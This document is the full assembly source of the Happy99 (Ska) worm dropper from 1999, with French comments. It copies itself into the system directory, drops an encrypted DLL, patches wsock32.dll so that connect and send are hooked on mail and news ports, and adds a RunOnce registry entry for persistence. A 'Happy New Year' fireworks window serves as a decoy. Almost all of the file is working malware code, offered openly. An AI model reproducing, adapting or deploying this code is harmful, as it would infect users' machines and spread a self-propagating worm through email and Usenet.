;ska.exe = happy99.exe
;if you want to understand comments, learn french or use Altavista ;)
;at the very end, you can post a message for me in alt.comp.virus
;look at the readme.rtf with WordPad for some explanations
;
; created files:
;
;  wsock32.ska      clean backup of wsock32.dll
;  ska.dll      my dll
;  ska.exe      the dropper
;  Happy99.exe      the traveller
;  liste.ska        list of infected friends

;--------------------------- (c) Spanska 1999 ---------------------------------

.386
.model flat

;*******************************************************************************************
;***                               API WINDOWS UTILISEES                                 ***
;*******************************************************************************************

extrn           ExitProcess     :PROC
extrn       CreateFileA     :PROC
extrn       ReadFile        :PROC
extrn       WriteFile       :PROC
extrn       CloseHandle     :PROC
extrn       CreateFileMappingA  :PROC
extrn       MapViewOfFile       :PROC
extrn       UnmapViewOfFile     :PROC
extrn       GetFileSize     :PROC
extrn       GetModuleHandleA    :PROC
extrn       GetProcAddress      :PROC
extrn       GetVersionExA       :PROC
extrn       GetSystemDirectoryA :PROC
extrn       GetWindowsDirectoryA    :PROC
extrn       CopyFileA       :PROC
extrn       LocalAlloc      :PROC
extrn       LocalFree       :PROC
extrn       GetModuleFileNameA  :PROC
extrn       RegCreateKeyExA     :PROC
extrn       RegSetValueExA      :PROC
extrn       RegCloseKey     :PROC

extrn       RegisterClassA      :PROC
extrn       CreateWindowExA     :PROC
extrn       ShowWindow      :PROC
extrn       UpdateWindow        :PROC
extrn       PeekMessageA        :PROC
extrn       SetPixelV       :PROC
extrn       TranslateMessage    :PROC
extrn       DispatchMessageA    :PROC
extrn       DefWindowProcA      :PROC
extrn       GetDC           :PROC
extrn       ReleaseDC       :PROC
extrn       PostQuitMessage     :PROC

.data

;*******************************************************************************************
;***                                       DATAS                                         ***
;*******************************************************************************************

;============================= madll.dll compressée et cryptée =============================

include madll.inc

;================================== quelques noms cryptés ==================================

signature   dd not "i sI", not " a t", not "uriv", not "a ,s", not "row ", not "a ,m"
        dd not "ort ", not "?naj", not "UOM ", not "OM-T", not "H TU", not "irby"
        dd not "c( d", not "pS )", not "ksna", not "91 a", not 0+".99"

        ;db "Is it a virus, a worm, a trojan? MOUT-MOUT Hybrid (c) Spanska 1999"

wsock_name      dd not "osw\"           ;db "\wsock32.dll",0
            dd not "23kc"
            dd not "lld."
            db not 0
wsock_name_size     equ $-offset wsock_name

ma_dll_name     dd not "akS\"           ;db "\Ska.dll",0
            dd not "lld."
            db not 0
ma_dll_name_size    equ $-offset ma_dll_name

dropper_name        dd not "akS\"           ;db "\Ska.exe",0
            dd not "exe."
            db not 0
dropper_name_size   equ $-offset dropper_name

sub_key_name        dd not "tfoS"
            dd not "eraw"
            dd not "ciM\"
            dd not "osor"           ;db "Software\Microsoft\Windows\
            dd not "W\tf"           ;db "CurrentVersion\RunOnce",0
            dd not "odni"
            dd not "C\sw"
            dd not "erru"
            dd not "eVtn"
            dd not "oisr"
            dd not "uR\n"
            dd not "cnOn"
            dw not 0+"e"

;====================================== divers ======================================

wsock_handle        dd ?
filehandlestock     dd ?
filemappinghandle   dd ?
startoffilemapping  dd ?
sizeofmappedfile    dd ?

startofPEheader     dd ?
nbofsection     dw ?
szoptheader     dw ?
diff            dd ?
cdiff           dd ?
idiff           dd ?
addoffunctions      dd ?
addofnames      dd ?        ;ne pas séparer ces trois
addofordinals       dd ?
rvaendofcode        dd ?
rvaoriginale_1      dd ?
rvaoriginale_2      dd ?
startofcodeheader   dd ?
verif           dd ?

krnl32ofs       dd ?
krnl32name      db "KERNEL32.dll",0
llname          db "LoadLibraryA",0
flname          db "FreeLibrary",0
gpaname         db "GetProcAddress",0

llofs           dd ?
flofs           dd ?
gpaofs          dd ?

writebuffer     dd ?        ;writebuffer
system_dir      dd ?        ;writebuffer+28000  ;ne pas séparer!
dropper_dir     dd ?        ;writebuffer+28200
system_dir_size     dd ?
NbBytesWritten      dd ?
ma_dll_handle       dd ?
NumberOfBytesRead   dd ?
key_handle      dd ?
patch_size      equ offset endpatch-offset startpatch

;============================ pour l'effet graphique ===========================

wndclass:
        clsStyle          dd 4003h  ; class style
        clsLpfnWndProc    dd ?
        clsCbClsExtra     dd 0
        clsCbWndExtra     dd 0
        clsHInstance      dd ?      ; instance handle
        clsHIcon          dd 0      ; class icon handle
        clsHCursor        dd 0      ; class cursor handle
        clsHbrBackground  dd 7      ; class background brush
        clsLpszMenuName   dd 0      ; menu name
        clsLpszClassName  dd ?      ; far ptr to class name

msg:
    msHWND          dd ?
    msMESSAGE       dd ?
    msWPARAM        dd ?
    msLPARAM        dd ?
    msTIME          dd ?
    msPT            dd ?
    protege dd ?

nb_explosions       dd 0
compteur        dd 0
yy          dd ?
xx          dd ?
seed            dd 0FFAABB11h
theDC           dd ?
nom_fenetre     db "Happy New Year 1999 !!",0
handle          dd ?
handle_wd       dd ?
adresse_retour      dd ?
pas_d_effet_graphique   dd ?

.code

HOST:

;*******************************************************************************************
;***                             SE RESERVER DE LA MEMOIRE                               ***
;*******************************************************************************************

push 1024*30        ;number of bytes to allocate
push LARGE 40h      ;allocation attributes (40h=LMEM_ZEROINIT)
call LocalAlloc
test eax, eax
jz stop
push eax

mov edi, offset writebuffer
stosd
add eax, 28000
stosd
add eax, 200
stosd

;*******************************************************************************************
;***                     VERIFIER QU'ON EST PAS SOUS W3.1                                ***
;*******************************************************************************************

;-------- quelle version de Windows?

pop eax
push eax
push eax
push eax
pop edi
mov eax, 148
stosd
call GetVersionExA
pop esi
add esi, 16
lodsd
cmp eax, 0          ;win32s=0, win32=1, WinNT=2
je stop

;*******************************************************************************************
;***                   COPIER LE DROPPER DANS C:\WINDOWS\SYSTEM                          ***
;*******************************************************************************************

;----- décrypter les datas

mov esi, offset signature
push esi
pop edi
mov ecx, offset wsock_handle - offset signature
decrypte:
lodsb
not al
stosb
loop decrypte

;----- recupérer le directory système 

push 200
push system_dir
call GetSystemDirectoryA        ;généralement C:\WINDOWS\SYSTEM
test eax, eax
jz stop2
mov system_dir_size, eax

;----- faire une copie du dropper dans C:\WINDOWS\SYSTEM

push 200
push dropper_dir
push 0
call GetModuleFileNameA         ;récupérer son path actuel
test eax, eax
jz stop2

mov esi, dropper_dir            ;si jamais le prog est "Ska"
add esi, eax                ;et pas "Happy1999", se souvenir
sub esi, 5              ;de ne pas déclencher l'effet
lodsb                   ;parce qu'il y a des chances
and al, 0DFh                ;que ce soit au boot
cmp al, "A"
jne c_pas_ska
mov pas_d_effet_graphique, -1

c_pas_ska:
mov esi, offset dropper_name
mov edi, system_dir
add edi, system_dir_size
mov ecx, dropper_name_size
rep movsb               ;concatenate "C:\WINDOWS\SYSTEM" et "DROP.EXE"

push 1                  ;si déjà présent, erreur
push system_dir
push dropper_dir
call CopyFileA              ;pas de test d'erreur car si on est au boot,
                    ;cet abruti se copie sur lui-même

;*******************************************************************************************
;***                      CREER MA DLL DANS C:\WINDOWS\SYSTEM                            ***
;*******************************************************************************************

;-------- décompresser et créér madll.dll dans C:\WINDOWS\SYSTEM

mov esi, offset A
mov edi, writebuffer

loop_decompresse:
lodsd
cmp eax, " DNE"
je fin_decompresse
cmp eax, "OREZ"
je suite_de_zero_a_decompresser
not eax
stosd
jmp loop_decompresse

suite_de_zero_a_decompresser:
lodsd
mov ecx, eax
xor eax, eax
rep stosd
jmp loop_decompresse

fin_decompresse:
mov ecx, edi
sub ecx, writebuffer
mov NbBytesWritten, ecx

mov esi, offset ma_dll_name ;concatenate "c:\windows\system" and "madll.dll"
mov edi, system_dir
add edi, system_dir_size
mov ecx, ma_dll_name_size
rep movsb

xor eax, eax
push eax            ;handle of file with attributes to copy (0=Ludwig)
push 80h            ;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 2              ;how to create (2=CREATE_ALWAYS)
push eax            ;address of security descriptor (0=Ludwig)
push eax            ;share mode (0=Prevents the file from being shared)
push 40000000h          ;access (read-write) mode (40000000h=GENERIC_WRITE)
push system_dir         ;address of file name
call CreateFileA
inc eax
jz stop
dec eax
mov ma_dll_handle, eax

push 0              ;addr. of structure needed for overlapped I/O (0 pour normale)
push offset NbBytesWritten  ;address of number of bytes written (si jamais tout n'est pas écrit)
push NbBytesWritten     ;number of bytes to write
push writebuffer        ;address of data to write to file
push ma_dll_handle      ;handle of file to write to
call WriteFile
test eax, eax
jz stop2

;*******************************************************************************************
;***                    FAIRE UNE COPIE PROPRE DE WSOCK32.DLL                            ***
;*******************************************************************************************

;------ créér le path entier de wsock32

mov esi, offset wsock_name
mov edi, system_dir
add edi, system_dir_size
mov ecx, wsock_name_size
rep movsb               ;concatenate "C:\WINDOWS\SYSTEM" et "WSOCK32.DLL"

;----- en faire une copie propre (ne suis-je point gentil?)

mov esi, system_dir
mov edi, dropper_dir
mov ecx, system_dir_size
add ecx, 13-4
rep movsb
mov eax, 0+"aks"
stosd

push 1                  ;si déjà présent, erreur
push dropper_dir
push system_dir
call CopyFileA

;*******************************************************************************************
;***                    INFECTER C:\WINDOWS\SYSTEM\WSOCK32.DLL                           ***
;*******************************************************************************************

;-------- ouvre wsock32.dll

xor eax, eax
push eax        ;handle of file with attributes to copy (0=Ludwig)
push 80h        ;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 3          ;how to create (3=OPEN_EXISTING)
push eax        ;address of security descriptor (0=Ludwig)
push eax        ;share mode (0=Prevents the file from being shared)
push 0C0000000h     ;access (read-write) mode (0C0000000h=GENERIC_READ+GENERIC_WRITE)
push system_dir     ;address of name of the file
call CreateFileA
inc eax
jnz la_suite_bordel

;------ si wsock32.dll en cours d'utilisation, le dropper s'éxécute au prochain boot

xor eax, eax
push writebuffer
push offset key_handle
push eax
push 1F0000h+1+2+4+8+10h+20h
push eax
push eax
push eax
push offset sub_key_name
push 80000002h              ;HKEY_LOCAL_MACHINE = 80000002h
call RegCreateKeyExA

mov eax, dropper_name_size-1
push eax
mov eax, offset dropper_name
inc eax
push eax
push 1                  ;REG_SZ=1
push 0
push eax
push key_handle
call RegSetValueExA

push key_handle
call RegCloseKey

jmp stop2

la_suite_bordel:
dec eax
mov wsock_handle, eax

;-------- prepare le mapping de wsock32.dll

xor eax, eax
push eax        ;name of file-mapping object (0=sans nom)
push eax        ;low-order 32 bits of object size  
push eax        ;high-order 32 bits of object size  (0=meme taille que le fichier)
push 4          ;protection for mapping object (4=PAGE_READWRITE)
push eax        ;optional security attributes (0=défaut)
push wsock_handle   ;handle of file to map
call CreateFileMappingA
test eax, eax
jz stop3
mov filemappinghandle, eax

;-------- mappe wsock32.dll

xor eax, eax
push eax        ;number of bytes to map (0=en entier)
push eax        ;low-order 32 bits of file offset
push eax        ;high-order 32 bits of file offset (0=meme taille que le fichier?)
push 6          ;access mode (6=SECTION_MAP_READ+SECTION_MAP_WRITE)
push filemappinghandle  ;file-mapping object to map into address space  
call MapViewOfFile
test eax, eax
jz stop4
mov startoffilemapping, eax

;------- verifie le MZ dans le header

mov esi, eax
cmp word ptr [esi], "ZM"
jne stop4

;------- verifie si deja infecte

cmp byte ptr [esi+12h], "z"
je stop4
mov byte ptr [esi+12h], "z"

;------- verifie le PE dans le header

add esi, [esi+3ch]          ;taille du stub DOS
cmp word ptr [esi], "EP"
jne stop4
mov startofPEheader, esi

;------- recupere quelques donnees dans le header

mov ax, [esi+6]
mov nbofsection, ax         ;number of sections
xor ecx, ecx
mov cx, nbofsection

mov ax, [esi+20]
mov szoptheader, ax         ;size of optional header

mov ebx, esi
add ebx, 24
xor eax, eax
add ax, szoptheader
add ebx, eax

;------- trouve les sections .edata, .text, .data

ttes_les_sections:
mov eax, [ebx]
cmp eax, "xet."
je trouve_text
continue_apres_text:
cmp eax, "ade."
je trouve_edata
continue_apres_edata:
cmp eax, "tad."
je trouve_data
continue_apres_data:
add ebx, 40         ;taille d'un section header 
dec ecx
jnz ttes_les_sections
jmp tout_trouve

;------- recupere des donnees dans le header de la section "exported data"

trouve_edata:
mov eax, [ebx+12]
sub eax, [ebx+20]
mov diff, eax
jmp continue_apres_edata

;------- recupere des donnees dans le header de la section "code"

trouve_text:
test [ebx+36], 60000020h    ;test si c'est du code
jz stop
or [ebx+36], 80000000h      ;rendre la section code capable d'être automodifiée
mov startofcodeheader, ebx
mov eax, [ebx+16]
mov edi, [ebx+8]
sub eax, edi
cmp eax, patch_size     ;test si suffisamment de place ds section code
jb stop
mov eax, [ebx+12]
mov edx, [ebx+20]
sub eax, edx
mov cdiff, eax
add edx, edi
mov rvaendofcode, edx
jmp continue_apres_text

;------- recupere des donnees dans le header de la section "imported data"

trouve_data:
mov eax, [ebx+12]
sub eax, [ebx+20]
mov idiff, eax
jmp continue_apres_data

;---------- se préparer à scanner la table des fonctions exportées

tout_trouve:

mov edi, offset addoffunctions
mov edx, diff
mov ebx,[esi+120]
mov esi, startoffilemapping         ; get export table RVA
sub ebx, edx
add ebx, esi

mov eax, [ebx+28]
sub eax, edx
add eax, esi
stosd                       ;addoffunctions
mov eax, [ebx+32]
sub eax, edx
add eax, esi
stosd                       ;addofnames
mov eax, [ebx+36]
sub eax, edx
add eax, esi
stosd                       ;addofordinals

mov ecx,[ebx+24]                          ; get number of name ptrs
xor edx,edx                               ; edx is our ordinal counter
mov esi, addofnames

;trouve le point d'entrée des fc exportées (connect, send) dans l'image mappée de Wsock32.dll

mov verif, 0            ;pour vérifier qu'on a bien trouvé les 2 fonctions
cherche_API:
mov ebx, [esi]
sub ebx, diff
add ebx, startoffilemapping
mov eax, [ebx]
cmp eax, "nnoc"
je trouve_API_1
cmp eax, "dnes"
je trouve_API_2
fausse_alerte:
inc edx
add esi, 4
dec ecx
jnz cherche_API
cmp verif, 2            ;on en cherche 2
jne stop
jmp suite

;-------- on a trouvé "connect"

trouve_API_1:
add ebx, 4
mov eax, [ebx]
cmp eax, 0+"tce"
jne fausse_alerte

push edx
push esi

mov ebx, addofordinals
shl edx, 1
add ebx, edx

xor eax, eax
mov ax, word ptr [ebx]

mov esi, addoffunctions 
shl eax, 2
add esi, eax

mov eax, [esi]              ;dans eax: RVA de connect
mov rvaoriginale_1, eax

mov eax, rvaendofcode
add eax, cdiff
add eax, (offset redirect_to_my_connect - offset startpatch)
mov [esi], eax              ;changer le point d'entree de la fonction

inc verif               ;une fc trouvée de plus
pop esi
pop edx
jmp fausse_alerte

;-------- on a trouvé send

trouve_API_2:
add ebx, 4
mov al, byte ptr [ebx]
cmp al, 0
jne fausse_alerte

push edx
push esi

mov ebx, addofordinals
shl edx, 1
add ebx, edx

xor eax, eax
mov ax, word ptr [ebx]

mov esi, addoffunctions 
shl eax, 2
add esi, eax

mov eax, [esi]              ;dans eax: RVA de send
mov rvaoriginale_2, eax

mov eax, rvaendofcode
add eax, cdiff
add eax, (offset redirect_to_my_send - offset startpatch)
mov [esi], eax              ;changer le point d'entree de la fonction

inc verif               ;une fc trouvée de plus
pop esi
pop edx
jmp fausse_alerte

suite:

mov esi, startofcodeheader
add dword ptr [esi+8], patch_size   ;changer dans le header la taille du code total

;------- cherche l'offset-handle du kernel32

push offset krnl32name
call GetModuleHandleA
test eax, eax
jz stop4
mov krnl32ofs, eax

;------- cherche l'adresse de l'API LoadLibrary qu'on appelera dans le patch 
;(mieux vaut aller direct dans le Kernel)

push offset llname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov llofs, eax

;------- cherche l'adresse de l'API FreeLibrary qu'on appelera dans le patch
;(mieux vaut aller direct dans le Kernel)

push offset flname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov flofs, eax

;------- cherche l'adresse de l'API GetProcAddress qu'on appelera dans le patch 
;(mieux vaut aller direct dans le Kernel)

push offset gpaname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov gpaofs, eax

;------- installer le patch

mov edi, rvaendofcode
add edi, startoffilemapping
call endpatch
    
    ;********************** CODE INSERE DANS WSOCK32.DLL **********************

    startpatch:

    ;===============> point d'entrée de la nouvelle connect <======================

    redirect_to_my_connect:
    pushfd
    pushad

    ;----- chope delta offset

    call delta1
    delta1: pop edi
    add edi, offset no_socket_mail-offset delta1

    ;----- vérifier si c'est une session mail ou news

    mov ebx, [esp+32+4+4+4]     ;32=pushad/4=pushfd/4=call/4=no de socket
    mov byte ptr al, [ebx+3]    ;le port dans al
    cmp al, 25          ;connection mail?
    jne teste_119
    mov eax, [esp+32+4+4]       ;no de socket
    stosb               ;stocke le no de socket connectée au port 25 
                    ;(dans no_socket_mail)
    inc edi             ;edi pointe maintenant sur handle_madll
    jmp la_suite
    teste_119:
    cmp al, 119         ;connection news?
    jne retour_a_connect        ;non=>on revient au send original
    inc edi             ;edi pointe maintenant vers no_socket_news
    mov eax, [esp+32+4+4]       ;no de socket
    stosb               ;stocke le no de socket connectée au port 119 
                    ;(dans no_socket_news)
    
    ;------ on charge ma librairie (LoadLibrary)

    la_suite:
    call ici_offset_de_ll           ;pour avoir "madll.dll" sur le stack
    db "Ska.dll",0
    ici_offset_de_ll: 
    mov eax, -1             ;!!!transformé au moment de l'infection!!!!!
    call eax                ;call LoadLibrary
    stosd                   ;sauver le handle de ma librairie

    ;------ et on se casse

    retour_a_connect:
    popad
    popfd
    ici_retour_relatif_a_connect:
    db 0E9h,0,0,0,0             ;!!!transformé au moment de l'infection!!!!!

    ;================> point d'entrée de la nouvelle send <============================

    redirect_to_my_send:
    pushfd
    pushad

    ;----- chope delta offset

    call delta2
    delta2: pop esi
    add esi, offset no_socket_mail-offset delta2

    ;----- on vérifie le numero de socket

    lodsw                   ;no_socket_mail = al, no_socket_news = ah
    mov ebx, [esp+32+4+4]           ;no de socket de la session actuelle
    cmp ah, bl              ;la socket actuelle est liée au port 119?
    je send_port_nntp           ;oui => on va ds la dll, routine "news"
    cmp al, bl              ;la socket actuelle est liée au port 25?
    je send_port_smtp           ;oui => on va ds la dll, routine "mail"

    jmp retour_a_send           ;socket actuelle liée à autre port, on revient

    ;------ récupérer l'offset de ma fonction (GetProcAddress)

    send_port_smtp:
    call zz_getprocad1          ;pour avoir "mail" sur le stack
    db "mail",0

    send_port_nntp:
    call zz_getprocad1          ;pour avoir "news" sur le stack
    db "news",0

    zz_getprocad1:
    lodsd                   ;récup du handle de ma librairie
    push eax                ;handle de ma librairie
    ici_offset_de_gpa:
    mov eax, -1             ;!!!transformé au moment de l'infection!!!!
    call eax                ;call GetProcAddress
    test eax, eax               ;probleme?
    jz retour_a_send            ;oui => on se casse

    ;------ appeler ma fonction avant send

    call eax                ;call MaFonction dans ma dll
    cmp al, 1               ;si en retour al=1, on ne décharge pas ma dll
    je retour_a_send            ;mais on revient simplement au send original
    xchg ax, bx             ;dans bl on a "N" ou "M"

    ;------ ma fonction a fini son travail?

    call delta3
    delta3: pop esi
    add esi, offset no_socket_mail-offset delta3    ;esi pointe vers no_socket_mail

    push esi
    pop edi                 ;edi aussi
    xor eax, eax

    cmp bl, "N"             ;une session news a foiré?
    jne autre               ;non => teste si c'est du mail
    inc edi                 ;edi pointe vers no_socket_news
    stosb                   ;on annule le hook de send_news
    lodsb                   ;et on regarde si send_mail est toujours hooké
    cmp al, 0
    jne retour_a_send           ;send_mail est toujours hooké => on revient
    inc esi                 ;esi pointe vers handle_madll
    jmp unload_dll              ;send_mail n'est pas hooké non plus 
                        ;=> on décharge ma dll (facon de parler)

    autre:
    cmp bl, "M"             ;une session mail a foiré?
    jne retour_a_send           ;non => on revient
    stosb                   ;on annule le hook de send_mail
    inc edi                 ;edi pointe vers handle_madll
    inc esi                 ;esi pointe vers no_socket_news
    lodsb                   ;on regarde si send_news est toujours hooké
    cmp al, 0
    jne retour_a_send           ;send_news est toujours hooké => on revient

    ;------ si oui, on décharge ma librairie

    unload_dll:
    lodsd                   ;handle de ma dll dans eax
    push eax
    ici_offset_de_fl:
    mov eax, -1             ;!!!transformé au moment de l'infection!!!!!
    call eax                ;call FreeLibrary

    ;----- on revient au send original

    retour_a_send:
    popad
    popfd
    ici_retour_relatif_a_send:
    db 0E9h,0,0,0,0             ;!!!transformé au moment de l'infection!!!!!

    no_socket_mail:     db 0
    no_socket_news:     db 0        ;ne pas séparer ces trois enfoirés
    handle_madll:       dd 0
    
    endpatch:

    ;***************************** FIN DU CODE INSERE ******************


;------ écrire le code dans l'image mappée

pop esi
mov ecx, offset endpatch-offset startpatch
rep movsb

;------ écrire les bonnes références aux 3 API du kernel

mov eax, llofs
mov [edi-(offset endpatch-offset ici_offset_de_ll)+1], eax
mov eax, gpaofs
mov [edi-(offset endpatch-offset ici_offset_de_gpa)+1], eax
mov eax, flofs
mov [edi-(offset endpatch-offset ici_offset_de_fl)+1], eax

;----- écrire les bons sauts de retour

mov edx, cdiff
mov eax, rvaendofcode
add eax, edx
add eax, (offset ici_retour_relatif_a_connect- offset startpatch)+4
sub eax, rvaoriginale_1
not eax
mov [edi-(offset endpatch-offset ici_retour_relatif_a_connect)+1], eax

mov eax, rvaendofcode
add eax, edx
add eax, (offset ici_retour_relatif_a_send- offset startpatch)+4
sub eax, rvaoriginale_2
not eax
mov [edi-(offset endpatch-offset ici_retour_relatif_a_send)+1], eax

stop5:
push startoffilemapping
call UnmapViewOfFile

stop4:
push filemappinghandle
call CloseHandle

stop3:
push wsock_handle
call CloseHandle

stop2:
push writebuffer
call LocalFree

stop:
cmp pas_d_effet_graphique, 0
je effet_graphique

push LARGE -1
call ExitProcess             ;this simply terminates the program

;*******************************************************************************************
;***                                 EFFET GRAPHIQUE                                     ***
;*******************************************************************************************

effet_graphique:
nombre_explosion_maxi equ 16

;----- se réserver de la mémoire

push (32*257)*nombre_explosion_maxi     ;number of bytes to allocate
push LARGE 40h                  ;allocation attributes (40h=LMEM_ZEROINIT)
call LocalAlloc
mov writebuffer, eax

;----- enregistrer la wndclass

push 0
call GetModuleHandleA
mov handle, eax

mov clsHInstance, eax
mov eax, offset wndproc
mov clsLpfnWndProc, eax
mov clsLpszClassName, offset nom_fenetre

push offset wndclass
call RegisterClassA

;----- creer la fenetre

xor eax, eax
push eax
push handle
push eax
push eax
push 512            ;hauteur
push 256            ;largeur
push 100            ;y
push 100            ;x
push 00080000h+00040000h
push offset nom_fenetre
push offset nom_fenetre
push eax                ;extra style
call CreateWindowExA
mov handle_wd, eax

push 1
push handle_wd
call ShowWindow

push handle_wd
call UpdateWindow

push handle_wd
call GetDC
mov theDC, eax

;----- le message loop

msg_loop:
xor eax, eax
push 1
push eax
push eax
push eax
push offset msg
call PeekMessageA
test eax, eax
jnz process_messages

;-------- dessiner tous les points

mov eax, compteur
and eax, nombre_explosion_maxi-1
mov compteur, eax
cmp eax, 0
jz ini_explosion

la_suite@:

mov ecx, 16*256
mov esi, writebuffer

zozo2:
push ecx
push esi
pop edi
add edi, 20
mov eax, dword ptr [esi+8]
stosd
mov eax, dword ptr [esi+12]
stosd

add dword ptr [esi], 001000h
lodsd
add dword ptr [esi+4], eax
lodsd
add dword ptr [esi+4], eax

lodsd
sar eax, 16
mov edx, eax
lodsd
sar eax, 16
mov ebx, eax

lodsd
cmp eax, 0
jne point_pas_noir
add esi, 8
jmp fin_loop

point_pas_noir:
sub byte ptr [esi-4], 1
jnc R_pas_a_zero
mov byte ptr [esi-4], 0
R_pas_a_zero:
sub byte ptr [esi-3], 1
jnc G_pas_a_zero
mov byte ptr [esi-3], 0
G_pas_a_zero:
sub byte ptr [esi-2], 1
jnc B_pas_a_zero
mov byte ptr [esi-2], 0
B_pas_a_zero:

push esi

push eax        ;colorref
push edx        ;y
push ebx        ;x
push theDC      ;the Device Context
call SetPixelV      ;quand la fenetre est repeinte, on met le pixel à sa coordonnée

pop esi

lodsd
sar eax, 16
mov edx, eax
lodsd
sar eax, 16

push esi

push 0
push edx
push eax
push theDC
call SetPixelV

pop esi

fin_loop:
add esi, 4

pop ecx
dec ecx
jnz zozo2

inc compteur

jmp msg_loop

;----- pour voir si la fenetre est fermée

process_messages:

cmp msMESSAGE, 12h  ;WM_QUIT equ 0012h
je end_loop

mov eax, offset msg
push eax
push eax
call TranslateMessage
call DispatchMessageA
jmp msg_loop

end_loop:

push theDC
push handle_wd
call ReleaseDC

mov pas_d_effet_graphique, -1

jmp stop2

;----- procédure de fenêtre vide pour accélérer

wndproc:

pop eax
mov adresse_retour, eax
cmp dword ptr [esp+4], 2
jne suite_prout

push 0
call PostQuitMessage
xor eax, eax
jmp suite2

suite_prout:
call DefWindowProcA

suite2:
mov ecx, adresse_retour
push ecx

ret

;----- procédure pour initialiser une explosion

ini_explosion:

mov eax, nb_explosions
and eax, nombre_explosion_maxi-1
mov nb_explosions, eax
shl eax, 13
mov edi, writebuffer
add edi, eax
mov ecx, 256

call random
shr eax, 8
mov xx, eax
call random
shr eax, 8
mov yy, eax
call random
shr eax, 8
or eax, 0AF0F0Fh
mov ebx, eax

zozo:
call random
shr eax, 15
mov [edi], eax

mov [edi+4], ecx
fild dword ptr [edi+4]      ;slow but good for size
fsin
fimul dword ptr [edi]
fild dword ptr [edi+4]
fcos
fimul dword ptr [edi]
fistp dword ptr [edi]
fistp dword ptr [edi+4]

add edi, 8

mov eax, yy
stosd
mov eax, xx
stosd

mov eax, ebx
stosd

add edi, 12
loop zozo

inc nb_explosions
jmp la_suite@

;----- random

random: 

mov eax, 214013h
imul seed
sub edx, edx                ; Prevent divide overflow by caller
add eax, 2531011h
mov seed, eax
ret

end     HOST

;--------------------------- (c) Spanska 1999 ---------------------------------
